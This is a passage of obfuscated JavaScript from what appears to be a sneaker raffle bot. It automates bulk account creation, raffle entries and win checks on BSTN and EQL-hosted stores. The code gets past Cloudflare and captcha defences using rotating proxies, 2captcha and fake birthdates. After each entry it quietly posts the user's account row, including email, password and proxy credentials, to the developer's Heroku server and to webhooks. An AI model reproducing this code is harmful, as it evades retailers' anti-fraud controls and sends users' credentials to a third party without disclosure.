                                                await _0x45cf9a['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x31952b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x31ca5a['send']('Browser.setWindowBounds', {
                                    'windowId': _0x50c7aa,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x5954fc(0x1388), await _0x31952b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x31952b['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5954fc(0x1f4), console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Logging\x20in'), await _0x31952b['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x547060 => _0x547060['click']()), await _0x31952b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x31952b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5954fc(0x7d0), await _0x31952b['waitForSelector']('#email-login'), await _0x31952b['type']('#email-login', '' + _0x8608f3[_0x558564]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x5954fc(0xdac), await _0x31952b['waitForSelector']('#password'), await _0x31952b['type']('#password', '' + _0x8608f3[_0x558564]['Password'], { 'delay': 0xe6 }), await _0x5954fc(0x157c);
                                try {
                                    await _0x31952b['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x45159a => _0x45159a['click']());
                                } catch {
                                }
                                try {
                                    await _0x31952b['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x3a6ca2) {
                                }
                                await _0x5954fc(0x3e8);
                                const _0x4c5f36 = await _0x31952b['$']('.enteredDraw_container__2KmQ_');
                                if (_0x4c5f36) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x8608f3[_0x558564]['Size']);
                                try {
                                    if (_0x8608f3[_0x558564]['Size'] != 'RANDOM') {
                                        var _0x3ed289 = _0x8608f3[_0x558564]['Size']['replace']('.', ',');
                                        const _0x1ea93e = await _0x31952b['$x']('//div[contains(text(),\x20\x27' + _0x3ed289 + '\x27)]');
                                        await _0x1ea93e[0x0]['click']();
                                    } else {
                                        const _0x58e48a = await _0x31952b['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x5e9380 = Math['round'](Math['random']() * (_0x58e48a['length'] - 0x1));
                                        await _0x58e48a[_0x5e9380]['click']();
                                    }
                                } catch (_0x49793b) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x5954fc(0x1f4);
                                const _0xca9d6f = await _0x31952b['$']('.addressList_addressItem__LE2PB');
                                if (_0xca9d6f && _0x8608f3[_0x558564]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x31952b['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x5954fc(0x5dc), await _0x31952b['waitForSelector']('#firstname'), await _0x31952b['type']('#firstname', '' + _0x8608f3[_0x558564]['FirstName']), await _0x5954fc(0x1f4), await _0x31952b['waitForSelector']('#firstname'), await _0x31952b['type']('#lastname', '' + _0x8608f3[_0x558564]['LastName']), await _0x5954fc(0x1f4), await _0x31952b['waitForSelector']('#firstname'), await _0x31952b['type']('#street', '' + _0x8608f3[_0x558564]['Address1']), await _0x5954fc(0x1f4), await _0x31952b['waitForSelector']('#firstname'), await _0x31952b['type']('#houseNumber', _0x8608f3[_0x558564]['HouseNumber'] + '\x20' + _0x8608f3[_0x558564]['Address2']), await _0x5954fc(0x1f4), await _0x31952b['waitForSelector']('#firstname'), await _0x31952b['select']('#country_code', '' + _0x8608f3[_0x558564]['Country']), await _0x5954fc(0x1f4), await _0x31952b['type']('#postcode', '' + _0x8608f3[_0x558564]['Zip']), await _0x5954fc(0x1f4), await _0x31952b['type']('#city', '' + _0x8608f3[_0x558564]['City']), await _0x5954fc(0x1f4), await _0x31952b['type']('#telephone', '' + _0x8608f3[_0x558564]['Phone']), await _0x5954fc(0x1f4), await _0x31952b['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x5954fc(0x9c4);
                                try {
                                    await _0x31952b['type']('#instagram_name', '' + _0x8608f3[_0x558564]['Follower']), await _0x31952b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x5954fc(0x5dc);
                                try {
                                    await _0x31952b['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x5954fc(0x5dc), await _0x31952b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xc4559b => _0xc4559b['click']()), await _0x5954fc(0x1388);
                                try {
                                    await _0x31952b['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x31952b['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x8608f3[_0x558564]['Size'] != 'RANDOM') {
                                        var _0x3ed289 = _0x8608f3[_0x558564]['Size']['replace']('.', ',');
                                        const _0x344942 = await _0x31952b['$x']('//div[contains(text(),\x20' + _0x3ed289 + ')]');
                                        await _0x344942[0x0]['click']();
                                    } else {
                                        const _0x574301 = await _0x31952b['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x5e9380 = Math['round'](Math['random']() * (_0x574301['length'] - 0x1));
                                        await _0x574301[_0x5e9380]['click']();
                                    }
                                    await _0x5954fc(0x5dc);
                                    try {
                                        await _0x31952b['hover']('#instagram_name'), await _0x31952b['type']('#instagram_name', '' + _0x8608f3[_0x558564]['Follower']), await _0x31952b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Retrying\x20(' + _0x337f32 + '\x20/\x205)');
                                    try {
                                        await _0x31952b['hover']('.checkBox_boxHolder__wLGVe'), await _0x5954fc(0x5dc), await _0x31952b['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x5954fc(0x157c), await _0x31952b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x120fdb => _0x120fdb['click']()), await _0x5954fc(0x1388), await _0x31952b['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x4a044b = 'no', _0x4904f4(_0x8608f3[_0x558564], _0x5e1cba);
                                try {
                                    prxdata = {
                                        'username': _0x4a7d40['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x424c46),
                                        'proxy': '' + _0x2d36b0[_0x558564]
                                    };
                                    var _0x28dc5a = JSON['stringify'](prxdata);
                                    let _0x2533c0 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x28dc5a, _0x2533c0);
                                } catch (_0x383b8f) {
                                }
                                console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x731857 = await _0xf2c38e(_0x8608f3[_0x558564], _0x5e1cba, 'dev', ![]), _0x51f28a = await _0xf2c38e(_0x8608f3[_0x558564], _0x5e1cba, 'pub', ![]);
                                const _0xd363d8 = {
                                    'succesDEVMSG': { 'embeds': [_0x731857] },
                                    'succesPUBMSG': { 'embeds': [_0x51f28a] }
                                };
                                let _0x424c46 = _0x8608f3[_0x558564];
                                try {
                                    prxdata = {
                                        'username': _0x4a7d40['replace']('#', ''),
                                        'module': _0x5e1cba['name'],
                                        'entrydata': JSON['stringify'](_0x424c46),
                                        'proxy': '' + _0x2d36b0[_0x558564]
                                    };
                                    var _0x28dc5a = JSON['stringify'](prxdata);
                                    let _0x1089fa = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x28dc5a, _0x1089fa);
                                } catch (_0x2ad74c) {
                                }
                                try {
                                    _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0xd363d8['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0xd363d8['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4b117a, _0xd363d8['succesPUBMSG']);
                                } catch (_0x4295f5) {
                                    console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4295f5));
                                }
                            } catch (_0x32850a) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20' + _0x32850a)), _0x4a044b = 'yes', _0x2123af = '' + _0x32850a;
                                var _0x2e5eb1 = await _0xf2c38e(_0x8608f3[_0x558564], _0x5e1cba, 'dev', !![], _0x2123af), _0x731857 = await _0xf2c38e(_0x8608f3[_0x558564], _0x5e1cba, 'dev', ![]), _0x51f28a = await _0xf2c38e(_0x8608f3[_0x558564], _0x5e1cba, 'pub', ![]);
                                const _0x3a950e = {
                                    'succesDEVMSG': { 'embeds': [_0x731857] },
                                    'succesPUBMSG': { 'embeds': [_0x51f28a] }
                                };
                                _0x3a950e['errorDEV'] = { 'embeds': [_0x2e5eb1] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x3a950e['errorDEV']), await _0x4bfa5b(_0x248b77, _0x3a950e['errorDEV']);
                            } finally {
                                _0x2d4b42 && _0x2d4b42['close']();
                                if (_0x4a044b == 'yes' && _0x337f32 != 0x5)
                                    return console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Retrying\x20(' + _0x337f32 + '\x20/\x205)')), _0x337f32 = _0x337f32 + 0x1, _0x15c5f2--, _0x2d5d59(_0x5e1cba, _0x8608f3, _0x2d36b0, _0x558564, _0x337f32);
                                _0x4a044b == 'yes' && _0x337f32 >= 0x5 && _0x1c26ba(_0x8608f3[_0x558564], _0x5e1cba), !_0x59af63 && (console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay'])), _0x15c5f2--;
                            }
                        }
                        _0x2d5d59(_0x1661db, _0x5062d9, _0x2326a5, _0x516edb, 0x0), await _0x5954fc(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xc65a12, _0x22da68) {
                    var _0x3f529e = 0x0, _0x2e0e7d;
                    try {
                        const _0x4cd37c = _0x1dee0c['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x2e0e7d = _0x548d40['parse'](_0x4cd37c, { 'header': !![] })['data'];
                    } catch (_0x3b410c) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x1158a7 = 0x0; _0x1158a7 < _0x2e0e7d['length']; _0x1158a7++) {
                        maxTasks = Number(_0x5d2560['threads']);
                        while (_0x3f529e >= maxTasks) {
                            await _0x5954fc(_0x5d2560['delay']);
                        }
                        async function _0x178ba3(_0x4c49ad, _0x396b73, _0x29ee93, _0x4a43ee, _0x2f39df) {
                            _0x3f529e++, _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x5d2560['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x44812e != 'yes')
                                var _0x44812e = '', _0x2f39df = 0x0;
                            var _0x4ceb54;
                            _0x34c195(_0x4c49ad['name'] + '\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20/\x20' + _0x29ee93['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                            var _0x5268e7 = await _0xf2c38e(_0x29ee93[_0x4a43ee], _0x4c49ad, 'acc', ![]);
                            const _0x4f50d9 = { 'succesDEVMSG': { 'embeds': [_0x5268e7] } }, _0x872141 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x29719c = Math['round'](Math['random']() * (_0x396b73['length'] - 0x1)), _0x1a4501 = _0x396b73[_0x29719c]['split'](':'), _0x2b7680;
                            try {
                                _0x2b7680 = await _0x13c80e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1a4501[0x0] + ':' + _0x1a4501[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x2b7680 = await _0x13c80e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1a4501[0x0] + ':' + _0x1a4501[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20:\x20Checking\x20' + _0x29ee93[_0x4a43ee]['Email']);
                                const _0x574239 = await _0x2b7680['newPage']();
                                await _0x574239['authenticate']({
                                    'username': '' + _0x1a4501[0x2],
                                    'password': '' + _0x1a4501[0x3]
                                }), console['log'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20:\x20Getting\x20Session'), await _0x574239['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x574239['setRequestInterception'](!![]), _0x574239['on']('request', _0x5e7d9a => {
                                    _0x5e7d9a['resourceType']() === 'image' ? _0x5e7d9a['abort']() : _0x5e7d9a['continue']();
                                });
                                try {
                                    await _0x574239['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x574239['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x44812e = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x574239['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5954fc(0x3e8), await _0x574239['type']('#email', _0x29ee93[_0x4a43ee]['Email']), await _0x5954fc(0x1f4), await _0x574239['type']('#pass', _0x29ee93[_0x4a43ee]['Password']), await _0x5954fc(0x1f4), await _0x574239['$eval']('#login-form', _0x14483a => _0x14483a['submit']());
                                try {
                                    await _0x574239['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x5954fc(0x190);
                                const _0x9a8f5f = await _0x574239['evaluate'](() => {
                                    const _0x22d100 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x22d100['map'](_0x1e8e0d => _0x1e8e0d['alt']);
                                }), _0x468638 = await _0x574239['evaluate'](() => {
                                    const _0x1b161a = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x1b161a['map'](_0x48430f => _0x48430f['innerHTML']);
                                }), _0x4d6010 = await _0x574239['$$']('.raffle-winner');
                                if (_0x4d6010['length'] < 0x1) {
                                    console['log'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x44812e = 'no';
                                    return;
                                }
                                console['log'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20:\x20' + _0x4d6010['length'] + '\x20Wins\x20Found!');
                                for (var _0x5d4306 = 0x0; _0x5d4306 < _0x4d6010['length']; _0x5d4306++) {
                                    console['log'](_0x28396b['green'](_0x9a8f5f[_0x5d4306] + _0x468638[_0x5d4306]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x31eeae) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20:\x20' + _0x31eeae)), _0x4ceb54 = '' + _0x31eeae;
                                var _0x1f8114 = await _0xf2c38e(_0x29ee93[_0x4a43ee], _0x4c49ad, 'acc', !![], _0x4ceb54);
                                _0x4f50d9['errorDEV'] = { 'embeds': [_0x1f8114] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x4f50d9['errorDEV']), await _0x4bfa5b(_0x248b77, _0x4f50d9['errorDEV']), _0x44812e = 'yes';
                            } finally {
                                if (_0x2b7680)
                                    _0x2b7680['close']();
                                if (_0x44812e == 'yes' && _0x2f39df != 0x5)
                                    return console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Task\x20' + (_0x4a43ee + 0x1) + '\x20:\x20Retrying\x20(' + _0x2f39df + '\x20/\x205)')), _0x3f529e--, _0x2f39df = _0x2f39df + 0x1, _0x178ba3(_0x4c49ad, _0x396b73, _0x29ee93, _0x4a43ee, _0x2f39df);
                                _0x44812e == 'yes' && _0x2f39df >= 0x5 && (_0x1c26ba(_0x29ee93[_0x4a43ee], _0x4c49ad), _0x44812e = 'no', _0x2f39df = 0x0), console['log'](_0x52b59e() + '\x20[' + _0x4c49ad['name'] + ']\x20Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']), _0x3f529e--;
                            }
                        }
                        _0x178ba3(_0xc65a12, _0x22da68, _0x2e0e7d, _0x1158a7, 0x0), await _0x5954fc(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x3a1370, _0x11f473, _0x1adb2d) {
                _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5d2560['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4108c4 = 0x0; _0x4108c4 < _0x11f473['length']; _0x4108c4++) {
                    var _0x2fcd07;
                    _0x34c195(_0x3a1370['name'] + '\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20/\x20' + _0x11f473['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                    try {
                        await _0x414596(_0x11f473, _0x4108c4);
                    } catch {
                        _0x23ae58 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x20428c(_0x546b31) {
                        const _0x5b3b0e = _0x1dee0c['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1b30a0 = _0x548d40['parse'](_0x5b3b0e, { 'header': !![] })['data'];
                        let _0x3efd50 = ![];
                        for (var _0x2a7134 of _0x1b30a0) {
                            if (_0x2a7134['Url'] == _0x546b31['Url'] && _0x2a7134['Email'] == _0x546b31['Email']) {
                                _0x3efd50 = !![];
                                break;
                            }
                        }
                        return _0x3efd50;
                    }
                    if (await _0x20428c(_0x11f473[_0x4108c4]) == !![]) {
                        console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x12653e = ![];
                    const _0x270169 = _0x1dee0c['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x4fdba9 = _0x548d40['parse'](_0x270169, { 'header': !![] })['data'];
                    for (var _0xf7f0e1 of _0x4fdba9) {
                        _0xf7f0e1['Email'] == _0x11f473[_0x4108c4]['Email'] && (_0x12653e = !![]);
                    }
                    if (_0x12653e == ![]) {
                        var _0x53a6df;
                        if (_0x11f473[_0x4108c4]['Url']['endsWith']('/')) {
                            _0x53a6df = _0x11f473[_0x4108c4]['Url'] + 'register';
                            if (_0x23ae58 != 'yes')
                                var _0x23ae58 = '', _0x551e82 = 0x0;
                        } else {
                            _0x53a6df = _0x11f473[_0x4108c4]['Url'] + '/register';
                            if (_0x23ae58 != 'yes')
                                var _0x23ae58 = '', _0x551e82 = 0x0;
                        }
                        if (_0x11f473[_0x4108c4]['Email'] == '' || _0x11f473[_0x4108c4]['FirstName'] == '' || _0x11f473[_0x4108c4]['LastName'] == '') {
                            console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x11f473[_0x4108c4]['Password'] == '' && (_0x11f473[_0x4108c4]['Password'] = 'JRaffles23!');
                        if (_0x5d2560['useRandomProxy'] = ![])
                            var _0x239503 = _0x1adb2d[_0x4108c4]['split'](':');
                        else
                            var _0x32076f = Math['round'](Math['random']() * (_0x1adb2d['length'] - 0x1)), _0x239503 = _0x1adb2d[_0x32076f]['split'](':');
                        var _0x253747;
                        try {
                            _0x253747 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x239503[0x0] + ':' + _0x239503[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x253747 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x239503[0x0] + ':' + _0x239503[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x33c324 = await _0x253747['newPage']();
                            await _0x33c324['authenticate']({
                                'username': '' + _0x239503[0x2],
                                'password': '' + _0x239503[0x3]
                            }), console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33c324['setRequestInterception'](!![]), _0x33c324['on']('request', _0x2f7f8d => {
                                _0x2f7f8d['resourceType']() === 'image' || _0x2f7f8d['resourceType']() === 'font' || _0x2f7f8d['resourceType']() === 'media' ? _0x2f7f8d['abort']() : _0x2f7f8d['continue']();
                            });
                            try {
                                await _0x33c324['goto']('' + _0x53a6df);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x5954fc(0x3e8), await _0x33c324['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x33c324['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x5954fc(0x3e8), _0x11f473[_0x4108c4]['Url']['includes']('en-GB') ? await _0x33c324['click']('li[data-value=\x22UK\x20' + _0x11f473[_0x4108c4]['Size'] + '\x20/\x20US\x20' + (Number(_0x11f473[_0x4108c4]['Size']) + 0x1) + '\x22]') : await _0x33c324['click']('li[data-value=\x22EU\x20' + _0x11f473[_0x4108c4]['Size'] + '\x22]');
                                } catch {
                                    await _0x33c324['click']('#productQuantity'), await _0x5954fc(0x3e8), await _0x33c324['click']('li[data-value=\x22' + (Number(_0x11f473[_0x4108c4]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x11f473[_0x4108c4]['Size']);
                            }
                            await _0x5954fc(0x6a4);
                            try {
                                await _0x33c324['select']('.PhoneInputCountrySelect', _0x11f473[_0x4108c4]['Country']);
                            } catch {
                            }
                            await _0x33c324['type']('#email', '' + _0x11f473[_0x4108c4]['Email']), await _0x5954fc(0x352), await _0x33c324['waitForSelector']('#password'), await _0x33c324['type']('#password', '' + _0x11f473[_0x4108c4]['Password']), await _0x5954fc(0x352), await _0x33c324['type']('#phone', '' + _0x11f473[_0x4108c4]['Phone']), await _0x5954fc(0x352);
                            const _0x4c9766 = await _0x33c324['$']('#title\x20>\x20label');
                            await _0x5954fc(0x12c);
                            _0x4c9766 && await _0x4c9766['click']();
                            await _0x33c324['type']('#firstName', '' + _0x11f473[_0x4108c4]['FirstName']), await _0x5954fc(0x352), await _0x33c324['type']('#lastName', '' + _0x11f473[_0x4108c4]['LastName']), await _0x5954fc(0x352);
                            _0x11f473[_0x4108c4]['Url']['includes']('footlocker.de') ? await _0x33c324['type']('#birthdate', _0x19e736(0xa, 0x1c) + '.' + _0x19e736(0xa, 0xc) + '.' + _0x19e736(0x7c6, 0x7d3)) : await _0x33c324['type']('#birthdate', _0x19e736(0xa, 0x1c) + '-' + _0x19e736(0xa, 0xc) + '-' + _0x19e736(0x7c6, 0x7d3));
                            await _0x5954fc(0x352), await _0x33c324['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x11f473[_0x4108c4]['Url']['includes']('en-GB') && await _0x33c324['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x5954fc(0x1f4), await _0x5954fc(0x5dc);
                            if (!_0x53a6df['includes']('footlocker'))
                                try {
                                    await _0x33c324['click']('#country');
                                    const _0x5d49c6 = await _0x33c324['$']('li[data-value=\x22' + _0x11f473[_0x4108c4]['Country'] + '\x22]');
                                    await _0x5d49c6['click'](), await _0x5d49c6['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x5954fc(0x3e8);
                            if (!_0x11f473[_0x4108c4]['Url']['includes']('en-GB')) {
                                await _0x33c324['click']('#stateAutocomplete'), await _0x5954fc(0x5dc);
                                try {
                                    const _0x1a8480 = await _0x33c324['$x']('//li[text()=\x22' + _0x11f473[_0x4108c4]['State'] + '\x22]');
                                    await _0x1a8480[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x5954fc(0x3e8), await _0x5954fc(0x1f4);
                            if (_0x11f473[_0x4108c4]['Url']['includes']('topps')) {
                                await _0x33c324['click']('#stateAutocomplete'), await _0x5954fc(0x5dc);
                                try {
                                    const _0x16b685 = await _0x33c324['$x']('//li[text()=\x22' + _0x11f473[_0x4108c4]['State'] + '\x22]');
                                    await _0x16b685[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
